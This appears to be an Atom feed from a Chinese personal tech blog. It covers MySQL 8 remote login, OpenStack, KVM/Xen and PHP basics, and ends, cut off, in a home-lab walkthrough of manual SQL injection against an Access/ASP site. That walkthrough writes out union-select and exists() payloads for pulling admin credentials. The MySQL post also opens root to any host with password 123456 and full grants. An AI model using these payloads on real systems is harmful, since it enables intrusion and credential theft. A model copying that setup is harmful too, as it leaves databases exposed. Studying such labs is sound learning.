    <published>2018-10-08T06:44:48.000Z</published>
    <updated>2019-10-04T05:48:10.736Z</updated>
    
    <content type="html"><![CDATA[<p>今天来水一篇，差点被这个远程登录搞死了，所以记录下这个问题。</p><p>先使用<code>status</code>命令查看一下<code>MySQL</code>版本，这里可以可以看到我用的是是<code>8.0.12</code>版本。</p><pre><code>mysql&gt; status--------------mysql  Ver 8.0.12 for Linux on x86_64 (MySQL Community Server - GPL)Connection id:          14Current database:       testCurrent user:           root@localhostSSL:                    Not in useCurrent pager:          stdoutUsing outfile:          &apos;&apos;Using delimiter:        ;Server version:         8.0.12 MySQL Community Server - GPLProtocol version:       10Connection:             Localhost via UNIX socketServer characterset:    utf8mb4Db     characterset:    utf8mb4Client characterset:    latin1Conn.  characterset:    latin1UNIX socket:            /var/run/mysqld/mysqld.sockUptime:                 25 min 14 secThreads: 3  Questions: 201  Slow queries: 0  Opens: 333  Flush tables: 2  Open tables: 309  Queries per second avg: 0.132--------------</code></pre><p>如果什么都不设置，那么用PHP连接时会报错：</p><pre><code>Warning: mysqli::__construct(): The server requested authentication method unknown to the client [caching_sha2_password]Warning: mysqli::__construct(): (HY000/2054): The server requested authentication method unknown to the client</code></pre><p><code>caching_sha2_password</code>报错是因为加密规则的原因。</p><p>可以在<code>mysql</code>数据库下查看相关信息。</p><pre><code>mysql&gt; use mysql;mysql&gt; select host, user, authentication_string, plugin from user; </code></pre><p><strong>解决方法</strong></p><p>首先修改远程用户加密规则</p><pre><code>mysql&gt; ALTER USER &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;123456&apos; PASSWORD EXPIRE NEVER;Query OK, 0 rows affected (0.03 sec)</code></pre><p>然后更新密码</p><pre><code>mysql&gt; ALTER USER &apos;root&apos;@&apos;%&apos; IDENTIFIED WITH mysql_native_password BY &apos;123456&apos;;Query OK, 0 rows affected (0.08 sec)</code></pre><p>刷新权限</p><pre><code>mysql&gt; flush privileges;Query OK, 0 rows affected (0.01 sec)</code></pre><p>搞定！</p><p><strong>授权所有权限远程登录</strong></p><pre><code>GRANT ALL ON *.* TO &apos;root&apos;@&apos;%&apos; WITH GRANT OPTION;8.0版本的授权命令</code></pre><p>刷新权限</p><pre><code>mysql&gt; flush privileges;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天来水一篇，差点被这个远程登录搞死了，所以记录下这个问题。&lt;/p&gt;
&lt;p&gt;先使用&lt;code&gt;status&lt;/code&gt;命令查看一下&lt;code&gt;MySQL&lt;/code&gt;版本，这里可以可以看到我用的是是&lt;code&gt;8.0.12&lt;/code&gt;版本。&lt;/p&gt;
&lt;pre&gt;&lt;code
      
    
    </summary>
    
      <category term="MySQL" scheme="https://www.gubeiqing.cn/categories/MySQL/"/>
    
    
      <category term="MySQL" scheme="https://www.gubeiqing.cn/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>简述openstack</title>
    <link href="https://www.gubeiqing.cn/2018/10/08/cloud02/"/>
    <id>https://www.gubeiqing.cn/2018/10/08/cloud02/</id>
    <published>2018-10-08T06:43:05.000Z</published>
    <updated>2019-10-04T04:05:14.849Z</updated>
    
    <content type="html"><![CDATA[<p>大家好，我顾某人又回来了。<br><strong>以下内容均为个人理解和整理，有不对的地方还望dalao指正。。。。。</strong><br>本文所用图片均已标明来源。</p><p><strong>openstack是什么？</strong><br>OpenStack是一个开源的云计算管理平台项目，由几个主要的组件组合起来完成具体工作。OpenStack支持几乎所有类型的云环境，项目目标是提供实施简单、可大规模扩展、丰富、标准统一的云计算管理平台。</p><p><strong>openstack组成</strong><br>openstack由以下七个主要部分组成：</p><ul><li>Nova：计算服务</li><li>Neutron：网络管理服务</li><li>Keystone：认证服务</li><li>Swift：对象存储服务</li><li>Cinder：块存储服务</li><li>Glance：镜像管理服务</li><li>Horizon：操作界面</li></ul><p><strong>openstack整体架构</strong><br>图源网络<br><img alt data-src="https://image.3001.net/images/20181123/15429714047540.png" class="lozad"></p><p><strong>openstack组成详解</strong></p><blockquote><p><strong>Nova</strong></p></blockquote><p>Nova提供CPU、内存、网络适配器和硬件驱动器等服务器资源虚拟化的功能，提高了资源的利用率。<br>通过Nova api来接受和响应用户的请求，实时对VM进行启动、挂起、停止等功能。<br>Nova主要包含的组件有：</p><ul><li>Nova-api<br>响应用户的请求</li><li>Nova-scheduler<br>负责VM的调度，决定了VM运行在哪台主机上。</li><li>Nova-compute<br>管理VM实例的生命周期</li><li>Nova-conductor<br>计算服务与数据库的交互中介，避免直接访问数据库</li><li>Nova-console<br>提供访问VM的控制台</li><li>Nova-consoleauth<br>负责对VM控制台的请求提供Token认证</li><li>Nova-cert<br>提供证书</li><li>Hypervisor<br>虚拟化管理程序，用于实现硬件的虚拟化</li><li>database<br>用于存放一些Nova的数据</li><li>message queue<br>用于Nova子服务之间的相互协调和通信</li></ul><blockquote><p><strong>Neutron</strong></p></blockquote><p>Neutron架构，图源CloudMan<br><img alt data-src="https://image.3001.net/images/20181123/15429714066102.jpg" class="lozad"><br>Neutron通过<code>plugin</code>和<code>agent</code>提供的网络服务。<br>调用网络的API分为以下两种：</p><ul><li>Core API<br>对外提供<code>network</code>、<code>subnet</code>和<code>port</code>的API</li><li>Resource and Attribute Extension API<br>对外提供管理<code>router</code>、<code>load balance</code>、<code>firewall</code>等资源的API。</li></ul><p>Neutron的<code>plugin</code>分为<code>Neutron Core Plugins</code>和<code>Neutron Service Plugins</code>。</p><ul><li>Neutron Core Plugins<br>Neutron的核心插件，实现<code>Core API</code>在数据库中维护<code>network</code>、<code>subnet</code>和<code>port</code>的状态，并负责调用相应的<code>agent</code>在<code>network provider</code>上执行相关操作.</li><li>Neutron Service Plugins<br>Neutron的扩展插件，实现<code>Extension Plugin API</code>，在数据库中维护<code>router</code>、<code>load balance</code>、<code>security group</code>等资源的状态，并负责调用相应的<code>agent</code>在<code>network provider</code>上执行相关操作.</li></ul><p>Message Queue:消息队列<br>用于<code>Plugins</code>和<code>Agent</code>相互之间的调用.</p><blockquote><p><strong>Keystone</strong></p></blockquote><p>keystone为openstack组件提供认证服务和管理用户及其权限。<br>keystone中有几个重要的概念要了解一下：User（用户）、Role（角色）、Tenant（租户）、Service（服务）。</p><ul><li>User   用户，keystone的授权用户</li><li>Role   角色，表示用户可以访问资源的权限</li><li>Tenant 租户，各个服务中可以访问的资源合集</li><li>Service 服务，租户可以提供的服务</li></ul><p>keystone的运作流程大概是这样的：当User想要去访问某个Service时，首先他要向keystone出示它的Credentials，Keystone认证之后会给User一个Token，然后User就可以使用这个Token去访问Service，这时这个Service就会向keystone去验证User的Token，如果验证成功，那么User就成功访问到Service中的Endpoint，且User的Role越高，访问到的Service越多。<br>通俗的来讲是这样的：<br>User|住酒店的人<br>|:-|:-<br>Tenant|酒店<br>Credentials|酒店房间钥匙<br>Authentication|房客认证机制<br>Token|发给能打开房间的人的凭证，用于享受酒店的服务<br>Service|酒店提供的一种服务<br>Endpoint|酒店提供服务中的具体服务<br>Role|酒店会员等级</p><blockquote><p><strong>Swift</strong></p></blockquote><p>Swift为OpenStack提供一种分布式、持续虚拟对象存储,主要用于存储大的对象文件,比如虚拟机的备份。</p><blockquote><p><strong>Cinder</strong></p></blockquote><p>openstack的一种块存储方式，挂载给虚拟机使用，可以给虚拟机提供额外的空间。<br><strong>swift和cinder的比较</strong><br><code>swift</code>类似于保存PC的系统，而<code>cinder</code>类似于保存PC里面的文件。</p><blockquote><p><strong>Glance</strong></p></blockquote><p>openstack中用于保存创建VM的镜像,比如，现在现在需要安装一个<code>win7</code>的操作系统给公司的某个员工使用，按照传统的操作方式需要花费大量时间，但是现在在云环境中，只需要直接从<code>glance</code>中按模板启动<code>win7</code>即可，二七人只许耗费几秒钟的时间<br><code>glance</code>包括<code>glance-api</code>、<code>glance-registry</code>和<code>store backend</code>.</p><ul><li>glance-api<br>对外提供API，用于响应<code>image</code>的查询、获取等调用。</li><li>glance-registry<br>用于处理和存取<code>image</code>的的元数据，例如大小、类型等，并且戴护具对应到<code>Database</code>。</li><li>store backend<br>用于存放<code>image</code>。</li></ul><blockquote><p><strong>Horizon</strong></p></blockquote><p>简单的来说，Horizon是一个web接口，用于将openstack的资源聚集到一起并进行图形化管理。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;大家好，我顾某人又回来了。&lt;br&gt;&lt;strong&gt;以下内容均为个人理解和整理，有不对的地方还望dalao指正。。。。。&lt;/strong&gt;&lt;br&gt;本文所用图片均已标明来源。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;openstack是什么？&lt;/strong&gt;&lt;br&gt;OpenStack是
      
    
    </summary>
    
      <category term="Cloud" scheme="https://www.gubeiqing.cn/categories/Cloud/"/>
    
    
      <category term="Cloud" scheme="https://www.gubeiqing.cn/tags/Cloud/"/>
    
      <category term="openstack" scheme="https://www.gubeiqing.cn/tags/openstack/"/>
    
  </entry>
  
  <entry>
    <title>简述KVM架构和Xen架构</title>
    <link href="https://www.gubeiqing.cn/2018/10/08/cloud01/"/>
    <id>https://www.gubeiqing.cn/2018/10/08/cloud01/</id>
    <published>2018-10-08T06:41:06.000Z</published>
    <updated>2019-10-04T04:05:12.469Z</updated>
    
    <content type="html"><![CDATA[<p><strong>以下均为个人理解，如果有不对的地方还望各位dalao不吝赐教。</strong></p><h1 id="虚拟化"><a href="#虚拟化" class="headerlink" title="虚拟化"></a>虚拟化</h1><p>虚拟化是通过Hypervisor程序实现的，Hypervisor的作用是将硬件虚拟化提供给多个操作系统使用，是虚拟化技术的核心。<br>虚拟化分为两种：<code>1型虚拟化</code>和<code>2型虚拟化</code>。</p><ul><li><code>1型虚拟化</code>是将Hypervisor直接安装在物理机上，然后虚拟机直接运行在Hypervisor上，<code>Xen</code>就是属于<code>1型虚拟化</code>。</li><li><code>2型虚拟化</code>是先在硬件上安装操作系统，然后将Hypervisor作为系统的一个程序运行在系统上从而实现对虚拟机的管理，<code>KVM</code>就是属于<code>2型虚拟化</code>。</li></ul><hr><h1 id="KVM架构"><a href="#KVM架构" class="headerlink" title="KVM架构"></a>KVM架构</h1><p><img alt data-src="https://image.3001.net/images/20181123/15429713363665.jpg" class="lozad"><br>先来看一下<code>KVM</code>，KVM是基于<code>Linux</code>内核实现的，<code>KVM</code>的内核模块叫做<code>kvm.ko</code>，实现对<code>Linux</code>的CPU和内存虚拟化，是<code>Linux</code>的一个进程，负责<code>VCPU</code>和<code>内存</code>的分配,而其他设备的虚拟就交给了<code>qemu</code>。<br><code>qemu</code>运行在用户空间，<code>KVM</code>运行在内核，两者通过<code>/dev/kvm</code>进行交互。<br><code>KVM</code>仅支持全局虚拟化。</p><hr><h1 id="Xen架构"><a href="#Xen架构" class="headerlink" title="Xen架构"></a>Xen架构</h1><p><img alt data-src="https://image.3001.net/images/20181123/15429713386970.jpg" class="lozad"><br>再来看一下<code>Xen</code>，<code>Xen</code>支持全虚拟化和半虚拟化，（<code>全虚拟化</code>就是运行在虚拟环境的虚拟机无法感知到自己是运行在虚拟环境之上，只会觉得自己是运行在硬件之上，<code>半虚拟化</code>是运行在虚拟环境的虚拟机可以感知到自己不是直接运行在硬件环境之上）这一点不同于<code>KVM</code>的仅支持全局虚拟化。<code>Xen</code>是直接运行在硬件上的，也就是上面提到的<code>1型虚拟化</code>，直接对硬件进行虚拟化，然后在硬件之上直接跑虚拟机，在<code>Xen</code>架构中的虚拟机分为两种：<code>Domain0</code>和<code>DoaminU</code>.<code>Domain0</code>又叫做<code>特权虚拟机</code>，具有直接访问硬件和管理其他操作系统的权限，而<code>DoaminU</code>就是普通的虚拟机，<code>DoaminU</code>不能直接访问硬件，所有的操作都是通过驱动发送到特权虚拟机<code>Domain0</code>，由<code>Domain0</code>去和硬件交互再返回给普通用户，所以，<code>Xen</code>架构的虚拟化需要先运行<code>Domain0</code>。<br><code>Xen</code>架构也是对<code>CPU</code>和<code>内存</code>进行虚拟化,提供给虚拟机用，其余硬件访问是通过<code>特权虚拟机</code>直接与硬件进行交互再返回的。<br>默认<code>Domain0</code>VCPU和内存的大小是这样计算的：</p><blockquote><p><code>Domain0的VCPU = 物理设备线程数 % 10</code>然后向上取最小的一个偶数，就是<code>Domain0</code>的VCPU数。<br>Domain0的内存：如果物理设备的内存小于96G，那么就默认为8G,如果物理机的内存大于96G，那么<code>Domain0的内存 = 物理机内存  *0.05 + 8G</code>。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;以下均为个人理解，如果有不对的地方还望各位dalao不吝赐教。&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;虚拟化&quot;&gt;&lt;a href=&quot;#虚拟化&quot; class=&quot;headerlink&quot; title=&quot;虚拟化&quot;&gt;&lt;/a&gt;虚拟化&lt;/h1&gt;&lt;p&gt;虚拟化是通过Hype
      
    
    </summary>
    
      <category term="Cloud" scheme="https://www.gubeiqing.cn/categories/Cloud/"/>
    
    
      <category term="Cloud" scheme="https://www.gubeiqing.cn/tags/Cloud/"/>
    
      <category term="虚拟化" scheme="https://www.gubeiqing.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>PHP接口</title>
    <link href="https://www.gubeiqing.cn/2018/10/06/php08/"/>
    <id>https://www.gubeiqing.cn/2018/10/06/php08/</id>
    <published>2018-10-06T12:27:55.000Z</published>
    <updated>2019-10-04T04:12:58.929Z</updated>
    
    <content type="html"><![CDATA[<p>PHP接口（<code>interface</code>）作用类似于继承中的父类，接口是用于给其他的类继承用的，但是接口中定义的方法都是没有方法体的且定义的方法必须是公有的。<br>举例：</p><pre><code>&lt;?php    interface iTemplate{        public function eat($food);        public function learn($code);    }    class student implements iTemplate{        public function eat($food){            echo &quot;student eat {$food}&quot;;        }        public function learn($code){            echo &quot;student learn {$code}&quot;;        }    }    $student = new student();    $student-&gt;eat(&apos;apple&apos;);    echo &apos;&lt;br /&gt;&apos;;    $student-&gt;learn(&apos;PHP&apos;);?&gt;</code></pre><p>输出：</p><pre><code>student eat applestudent learn PHP</code></pre><p>接口中除了方法也是可以定义属性的，但必须是常量。</p><pre><code>&lt;?php    interface iTemplate{        public function eat($food);        public function learn($code);        const A=&apos;我是常量&apos;;    }    class student implements iTemplate{        public function eat($food){            echo &quot;student eat {$food}&quot;;        }        public function learn($code){            echo &quot;student learn {$code}&quot;;        }        public function changliang(){            echo ITemplate::A;        }    }    $student = new student();    $student-&gt;eat(&apos;apple&apos;);    echo &apos;&lt;br /&gt;&apos;;    $student-&gt;learn(&apos;PHP&apos;);    echo &apos;&lt;br /&gt;&apos;;    $student-&gt;changliang();?&gt;</code></pre><p>输出：</p><pre><code>student eat applestudent learn PHP我是常量</code></pre><p>那么既然是定义给其他类使用，就存在继承的问题，接口是可以多继承的。<br>举例：</p><pre><code>&lt;?php    interface iTemplate1{        public function eat($food);    }    interface iTemplate2{        public function learn($code);    }    class student implements iTemplate1,iTemplate2{        public function eat($food){            echo &quot;student eat {$food}&quot;;        }        public function learn($code){            echo &quot;student learn {$code}&quot;;        }    }    $student = new student();    $student-&gt;eat(&apos;apple&apos;);    echo &apos;&lt;br /&gt;&apos;;    $student-&gt;learn(&apos;PHP&apos;);?&gt;</code></pre><p>输出：</p><pre><code>student eat applestudent learn PHP</code></pre><p>这样就在<code>student</code>类中继承了<code>iTemplate1</code>和<code>iTemplate2</code>接口,话可以先让<code>iTemplate2</code>接口继承<code>iTemplate1</code>接口，再让<code>student</code>类去继承<code>iTemplate1</code>接口，实现的效果同上。<br>举例：</p><pre><code>&lt;?php    interface iTemplate1{        public function eat($food);    }    interface iTemplate2 extends iTemplate1{        public function learn($code);    }    class student implements iTemplate2{        public function eat($food){            echo &quot;student eat {$food}&quot;;        }        public function learn($code){            echo &quot;student learn {$code}&quot;;        }    }    $student = new student();    $student-&gt;eat(&apos;apple&apos;);    echo &apos;&lt;br /&gt;&apos;;    $student-&gt;learn(&apos;PHP&apos;);?&gt;</code></pre><p>输出：</p><pre><code>student eat applestudent learn PHP</code></pre><p>总结一下：</p><ul><li>接口不能实例化</li><li>接口中的方法不能有方法体</li><li>继承接口的方法必须实现接口中的所有方法</li><li>一个类可以继承多个接口</li><li>接口中的属性必须是常量</li><li>接口中的方法必须是public（默认public）</li></ul><p>不对的地方还望dalao们指正。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;PHP接口（&lt;code&gt;interface&lt;/code&gt;）作用类似于继承中的父类，接口是用于给其他的类继承用的，但是接口中定义的方法都是没有方法体的且定义的方法必须是公有的。&lt;br&gt;举例：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
    interface iTem
      
    
    </summary>
    
      <category term="PHP" scheme="https://www.gubeiqing.cn/categories/PHP/"/>
    
    
      <category term="PHP" scheme="https://www.gubeiqing.cn/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP继承</title>
    <link href="https://www.gubeiqing.cn/2018/10/06/php07/"/>
    <id>https://www.gubeiqing.cn/2018/10/06/php07/</id>
    <published>2018-10-06T12:26:37.000Z</published>
    <updated>2019-10-04T04:12:50.842Z</updated>
    
    <content type="html"><![CDATA[<p><strong>以下都是我个人的理解，有错的地方还望不吝赐教。</strong><br><strong>为什么需要继承？</strong><br>继承就是 一个子类通过extends父类把父类的属性和方法继承下来。<br>假设现在现在需要写两个类，小学生类和高中生类，小学生会说话，走路，考试，高中生也会说话走路，考试，那么如果你写两遍说话，走路，考试，那么就会显得臃肿，管理起来也会麻烦很多，如果定义一个类叫做学生类包含说话，走路，考试，然后让小学生类和高中生类来继承这个学生类就会显得好很多，比如这样。</p><pre><code>&lt;?phpclass student{    function speak(){        echo &apos;说话&apos;;    }    function walk(){        echo &apos;走路&apos;;    }    function test(){        echo &apos;考试&apos;;    }}class pupil extends student{    function test(){        echo &apos;小学生考试&apos;;    }}class senior extends student{    function test(){        echo &apos;高中生考试&apos;;    }}$pupil=new pupil();$pupil-&gt;speak();$pupil-&gt;walk();$pupil-&gt;test();echo &apos;&lt;br /&gt;&apos;;$senior=new senior();$senior-&gt;speak();$senior-&gt;walk();$senior-&gt;test();?&gt;</code></pre><p>输出：</p><pre><code>说话走路小学生考试说话走路高中生考试</code></pre><p>这样代码管理起来就会好很多。<br>假设现在小学生要学习一个新的技能吃东西，我现在这样写。</p><pre><code>&lt;?php    class student{        function speak(){            echo &apos;说话&apos;;        }        function walk(){            echo &apos;走路&apos;;        }        function test(){            echo &apos;考试&apos;;        }    }    class skill{        function eat(){            echo &apos;吃东西&apos;;        }    }    class pupil extends student，skill{        function test(){            echo &apos;小学生考试&apos;;        }    }    $pupil=new pupil();    $pupil-&gt;speak();    $pupil-&gt;walk();    $pupil-&gt;test();    $pupil-&gt;eat();?&gt;</code></pre><p>如果这样写，那么就会报错：</p><pre><code>Fatal error: Class &apos;studentskill&apos; not found in D:\xampp\htdocs\1.php on line 18</code></pre><p>因为php中是不能这样实现多继承的，如果想要实现多继承可以这么写：</p><pre><code>&lt;?php        class student{            function speak(){                echo &apos;说话&apos;;            }            function walk(){                echo &apos;走路&apos;;            }            function test(){                echo &apos;考试&apos;;            }        }        class skill extends student{            function eat(){                echo &apos;吃东西&apos;;            }        }        class pupil extends skill{            function test(){                echo &apos;小学生考试&apos;;            }        }        $pupil=new pupil();        $pupil-&gt;speak();        $pupil-&gt;walk();        $pupil-&gt;test();        $pupil-&gt;eat();?&gt;</code></pre><p>输出:</p><pre><code>说话走路小学生考试吃东西</code></pre><p>先用一个skill类继承student类，然后再用pupil类继承skill类，这样就相当于pupil类继承了student类和skill类。</p><p><strong>方法重写</strong><br>如果要实现的两个类有共同特征，那么就可以将这个共同的特征抽象出一个父类。<br>比如，有小学生类和中学生类，这样的两个类，他们都是学生，那么就可以抽象出一个学生类，学生都会考试，那么就把考试这个方法写在学生这个类里面。<br>那么问题就是，小学生是小学生的考试，中学生是中学生的考试，我不可能都输出考试，这里就用到了方法重写。<br>在子类中定义一个与父类一样的方法，这样执行的时候，父类中的方法就会被覆盖，从而输出的只有子类中定义的方法。<br>举例：</p><pre><code>&lt;?php        class student{            function test(){                echo &apos;考试&apos;;            }        }        class pupil extends student{            function test(){                echo &apos;小学生考试&apos;;            }        }        class senior extends student{            function test(){                echo &apos;中学生考试&apos;;            }        }        $pupil=new pupil();        $pupil-&gt;test();        echo &apos;&lt;br /&gt;&apos;;        $senior=new senior();        $senior-&gt;test();?&gt;</code></pre><p>输出：</p><pre><code>小学生考试中学生考试</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;以下都是我个人的理解，有错的地方还望不吝赐教。&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;为什么需要继承？&lt;/strong&gt;&lt;br&gt;继承就是 一个子类通过extends父类把父类的属性和方法继承下来。&lt;br&gt;假设现在现在需要写两个类，小学生类和高中生类，小学生
      
    
    </summary>
    
      <category term="PHP" scheme="https://www.gubeiqing.cn/categories/PHP/"/>
    
    
      <category term="PHP" scheme="https://www.gubeiqing.cn/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP匿名函数</title>
    <link href="https://www.gubeiqing.cn/2018/10/06/php06/"/>
    <id>https://www.gubeiqing.cn/2018/10/06/php06/</id>
    <published>2018-10-06T12:25:43.000Z</published>
    <updated>2019-10-04T04:12:44.394Z</updated>
    
    <content type="html"><![CDATA[<p>匿名函数（Anonymous functions），也叫闭包函数（closures），允许临时创建一个没有指定名称的函数。最经常用作回调函数（callback）参数的值。</p><p>举例：</p><pre><code>&lt;?php    $greet=function($name){        echo &apos;Hello &apos;.$name;    };    $greet(&apos;World!&apos;);?&gt;</code></pre><p>这样会输出</p><pre><code>Hello World!</code></pre><p>假设现在要在匿名函数中调用普通的变量：</p><pre><code>&lt;?php    $name=&apos;Hello World!&apos;;    $greet=function(){        echo $name;    };    $greet();?&gt;</code></pre><p>如果是这么使用，那么就会报一个错误：</p><pre><code>PHP Notice:  Undefined variable: name in /code/main.php on line 4</code></pre><p>应该是这么使用：</p><pre><code>&lt;?php    $name=&apos;Hello World!&apos;;    $greet=function() use ($name){        echo $name;    };    $greet();?&gt;</code></pre><p>这样就会返回</p><pre><code>Hello World!</code></pre><p>以上理解如果有不对的地方，还望dalao们指正。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;匿名函数（Anonymous functions），也叫闭包函数（closures），允许临时创建一个没有指定名称的函数。最经常用作回调函数（callback）参数的值。&lt;/p&gt;
&lt;p&gt;举例：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
    $greet=funct
      
    
    </summary>
    
      <category term="PHP" scheme="https://www.gubeiqing.cn/categories/PHP/"/>
    
    
      <category term="PHP" scheme="https://www.gubeiqing.cn/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP实现类似题库抽题效果</title>
    <link href="https://www.gubeiqing.cn/2018/10/06/php05/"/>
    <id>https://www.gubeiqing.cn/2018/10/06/php05/</id>
    <published>2018-10-06T12:24:20.000Z</published>
    <updated>2019-10-04T04:12:38.470Z</updated>
    
    <content type="html"><![CDATA[<p>大家好，我顾某人又回来了，最近学了一点PHP，然后就想写个简单小例子试试，于是就写了一个类似于从题库抽题的东西，大概就是先输入需要抽题的数量，然后从数据库中随机抽取题目。<br>希望各位大佬轻喷。<br>假设我现在有这样一个题库：<br><img alt data-src="https://image.3001.net/images/20181123/1542972400459.jpg" class="lozad"><br>啊？为什么要用英文？，因为我，，没搞定编码问题😭。<br>接着我来进行抽题：<br><img alt data-src="https://image.3001.net/images/20181123/15429724026277.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429724043043.jpg" class="lozad"><br>这样就随机抽出了三道题目。</p><hr><p>现在来说说我的思路，希望各位大佬不吝赐教。<br>首先要实现这个功能，<strong>首先</strong>我需要三个页面，一个是用户输入页面<code>input.html</code>，一个是后台处理页面<code>select.php</code>，还有一个是错误警告页面<code>error.html</code>（如果用户输入为空，或者输入的抽题数量超过了题库的数量那么就报错），<strong>然后</strong>是数据库，数据库分为两列，一列是<code>question</code>，用来存放题目，另一列是<code>id</code>，用于标识<code>question</code>。</p><p>然后对用户的输入进行判断：<br><img alt data-src="https://image.3001.net/images/20181123/1542972406294.jpg" class="lozad"></p><hr><p><code>input.html</code>页面：</p><pre><code>&lt;html&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;    &lt;form action=&quot;select.php&quot; method=&quot;get&quot;&gt;        请输入要随机生成的题数：&lt;input type=&quot;text&quot; name=&quot;input&quot; /&gt;        &lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;提交&quot; /&gt;    &lt;/form&gt;&lt;/html&gt;</code></pre><p><code>error.html</code>页面：</p><pre><code>&lt;html&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;    &lt;p&gt;您的输入有误，请重新输入！&lt;/p&gt;&lt;/html&gt;</code></pre><p><code>select.php</code>页面：</p><pre><code>&lt;?php    header(&quot;Content-type:text/html;charset=utf8&quot;);    $connect=new mysqli(&apos;localhost&apos;,&apos;wy&apos;,&apos;000000&apos;,&apos;test&apos;);    if(!$connect){        die(&quot;数据库连接失败！&quot;);    }                           //连接数据库    $sql=&quot;select id from test&quot;;    $result=$connect-&gt;query($sql);    $array=array();    $i=0;    while($row=$result-&gt;fetch_row()){        foreach($row as $val){            $array[$i]=$val;             $i ++;        }    }                          //将题目id存放进一个数组array    $input=$_GET[&apos;input&apos;];    //接受用户的输入    if(empty($input) || $input&gt;count($array)){  //判断用户的输入是否为空或输入大于题库数量        header(&quot;Location:error.html&quot;);    //输入有误重定向到错误提示页面    }else{        shuffle($array);    //将存放题目id的数组进行随机排序        $k=0;               //用于取出rand数组中question时的id        for($j=0;$j&lt;$input;$j++){            $rand=array_slice($array,0,$input);     //从数组的第一个数开始，取出用户输入数量个id存放进一个数组            $sql2=&quot;select * from test where id=&apos;{$rand[$k]}&apos;&quot;;  //查找rand数组中每一个id对应的question            $result2=$connect-&gt;query($sql2);    //存放mysql语句返回的结果集            while($row2=$result2-&gt;fetch_assoc()){                echo $row2[&apos;question&apos;];     //返回question对应的内容                echo &apos;&lt;br /&gt;&apos;;            }            $k++;        }        $result2-&gt;free();   //释放内存    }    $result-&gt;free();        //释放内存    $connect-&gt;close();      //关闭连接?&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;大家好，我顾某人又回来了，最近学了一点PHP，然后就想写个简单小例子试试，于是就写了一个类似于从题库抽题的东西，大概就是先输入需要抽题的数量，然后从数据库中随机抽取题目。&lt;br&gt;希望各位大佬轻喷。&lt;br&gt;假设我现在有这样一个题库：&lt;br&gt;&lt;img alt data-src=
      
    
    </summary>
    
      <category term="PHP" scheme="https://www.gubeiqing.cn/categories/PHP/"/>
    
    
      <category term="PHP" scheme="https://www.gubeiqing.cn/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Access手工注入</title>
    <link href="https://www.gubeiqing.cn/2018/09/23/Access%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/"/>
    <id>https://www.gubeiqing.cn/2018/09/23/Access手工注入/</id>
    <published>2018-09-23T07:40:30.000Z</published>
    <updated>2019-10-04T04:15:24.256Z</updated>
    
    <content type="html"><![CDATA[<p>哈哈哈哈，，，我顾北清又回来啦，接着更新。<br>实验环境：win2008R2虚拟机，物理机（也就是我的win10）。<br>搭建环境用的是access+asp源码。</p><p>环境搭建可以参照<a href="https://www.cnblogs.com/Timesi/p/9362651.html" target="_blank" rel="noopener">这里</a>，不同的是在第六步勾选<code>应用程序开发</code>选项。<br>环境搞完之后大概是这个样子的：<br><img alt data-src="https://image.3001.net/images/20181123/15429730656216.jpg" class="lozad"><br>接着来手工注入一下。<br>首先判断有没有注入点，随便点进一个页面：<br><img alt data-src="https://image.3001.net/images/20181123/15429730685639.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429730705639.jpg" class="lozad"><br><code>%20</code>是空格的转码。<br><code>and 1=1</code>没有出错，再来试试<code>and 1=2</code>。<br><img alt data-src="https://image.3001.net/images/20181123/15429730728173.jpg" class="lozad"><br>出错了，说明它将这条语句带入查询了，说明存在注入点。</p><p>1.联合查询法<br>先判断字段长度，使用<code>order by 猜测的长度</code>。<br>我这里猜测长度是22（因为我事先知道/滑稽脸，所以命令是<code>order by 22</code>。<br><img alt data-src="https://image.3001.net/images/20181123/15429730734852.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429730761981.jpg" class="lozad"><br>判断到22的时候是正常的，到23的时候报错了，说明，字段长度是22。<br>然后来猜解表名，使用的命令是：<code>union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</code>.<br><code>admin</code>是我猜解的表名。<br><img alt data-src="https://image.3001.net/images/20181123/15429730787882.jpg" class="lozad"><br>发现这里爆出一个<code>3</code>和<code>15</code>,说明<code>3</code>和<code>15</code>这两个位置存在数据，接着来用猜解的数据替换这两个位置。<br><img alt data-src="https://image.3001.net/images/20181123/15429730809078.jpg" class="lozad"><br>图中的<code>admin</code>和<code>password</code>是猜解的字段，如果此阿姐正确就会爆出这两个位置的数据，这样就拿到了账号密码。</p><p>2.逐字猜解法<br>首先判断是否存在某个表：<br>这里使用的命令是<code>and exists ( select * from admin)</code>,判断是否存在<code>admin</code>表。<br><img alt data-src="https://image.3001.net/images/20181123/15429730811010.jpg" class="lozad"><br>没有报错，说明存在<code>admin</code>表，接着来判断<code>admin</code>表中的字段，这里使用<code>and exists ( select admin from 